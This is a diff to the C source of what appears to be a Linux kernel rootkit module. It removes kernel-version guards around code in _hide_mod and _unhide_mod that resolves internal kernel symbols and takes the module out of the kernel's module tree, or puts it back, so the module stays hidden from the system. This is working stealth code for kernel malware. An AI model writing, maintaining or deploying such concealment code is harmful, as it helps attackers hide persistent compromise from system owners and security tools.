@@ -240,7 +240,6 @@ static int _hide_mod(void)
 
 	// Remove module from mod_tree if
 	// CONFIG_MODULES_TREE_LOOKUP is enabled
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
 	struct kernel_syscalls *ks = kv_kall_load_addr();
 	if (ks) {
 		void (*k_mod_tree_remove)(struct module *mod) =
@@ -249,7 +248,6 @@ static int _hide_mod(void)
 		if (k_mod_tree_remove)
 			k_mod_tree_remove(lkmmod.this_mod);
 	}
-#endif
 
 	return 0;
 }
@@ -313,7 +311,6 @@ static int _unhide_mod(void)
 	spin_unlock(&hiddenmod_spinlock);
 
 	// Restore mod_tree entry
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
 	struct kernel_syscalls *ks = kv_kall_load_addr();
 	if (ks) {
 		void (*k_mod_tree_insert)(struct module *mod) =
@@ -322,7 +319,6 @@ static int _unhide_mod(void)
 		if (k_mod_tree_insert)
 			k_mod_tree_insert(lkmmod.this_mod);
 	}
-#endif
 
 	goto out_put_kobj;
 
